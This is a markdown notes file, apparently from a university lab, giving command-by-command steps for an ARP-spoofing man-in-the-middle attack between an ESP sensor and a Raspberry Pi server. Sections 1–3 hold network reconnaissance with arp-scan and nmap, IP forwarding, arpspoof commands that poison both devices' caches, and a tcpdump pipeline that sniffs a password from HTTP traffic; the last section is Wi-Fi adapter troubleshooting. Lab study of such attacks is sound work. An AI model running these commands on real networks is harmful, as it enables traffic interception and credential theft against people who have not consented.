# 📡 Network Interception & MITM Attack Notes

This document contains the step-by-step commands used to execute the Man-in-the-Middle (MITM) attack between the ESP device and the Raspberry Pi server, as well as troubleshooting steps for the Kali Linux network adapter.

---

## 🔍 1. Network Reconnaissance (Finding Targets)
Before attacking, we need to find the IP and MAC addresses of the Raspberry Pi (Server) and the ESP (Sensor) on the network. 

**Option A: Using `arp-scan` (Fastest)**
```bash
sudo arp-scan --interface=wlan0 --localnet
```

**Option B: Using `nmap`**
*(Note: Replace `10.92.161.0/24` with whatever network we are given by the University)*
```bash
sudo nmap -sn 10.92.161.0/24
```

---

## ⚔️ 2. Executing the MITM Attack (ARP Spoofing)
Once we have the IP addresses of the RPi and the ESP, we can intercept the traffic.

**Step 2.1: Enable IP Forwarding (CRITICAL)**
If we don't do this, the devices will lose connection. This tells Kali to route the traffic.
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

**Step 2.2: Poison the ARP Cache**
Open two separate terminal windows to trick both devices simultaneously.

*Terminal 1 (Trick the ESP):*
```bash
sudo arpspoof -i wlan0 -t <ESP_IP> <RPi_IP>
```
*Terminal 2 (Trick the RPi):*
```bash
sudo arpspoof -i wlan0 -t <RPi_IP> <ESP_IP>
```

**Step 2.3: Capture the Data**
Open a third terminal to sniff the HTTP traffic crossing our machine and grep for our specific payload/password.
```bash
sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "secretpass"
```

---

## 🛠️ 3. Alternative Tools (Bettercap)
What I used here because the tool is nice, but didn't really work at the end with intercepting the data (XD). It is still great for visual reconnaissance.

```bash
sudo bettercap -iface wlan0
```
*(Inside the bettercap console):*
```bettercap
net.probe on
net.show
```

---

## 🚑 4. Troubleshooting: Network Card Stuck in Monitor Mode
*From AI in case the network card doesn't work correctly:*

If you ever run `iwconfig` and see `Mode:Monitor` or notice your IP address is `0.0.0.0`, it means your card is stuck and passively listening instead of connecting to the Wi-Fi. Here is the exact sequence to slap it back into Managed Mode so you can connect to the Wi-Fi:

```bash
# 1. Turn the Wi-Fi card off (take it offline)
sudo ifconfig wlan0 down

# 2. Force the hardware back into normal "Managed" mode
sudo iwconfig wlan0 mode managed

# 3. Turn the Wi-Fi card back on
sudo ifconfig wlan0 up

# 4. Restart Kali's network brain so it realizes the card is ready to connect
sudo systemctl restart NetworkManager
```
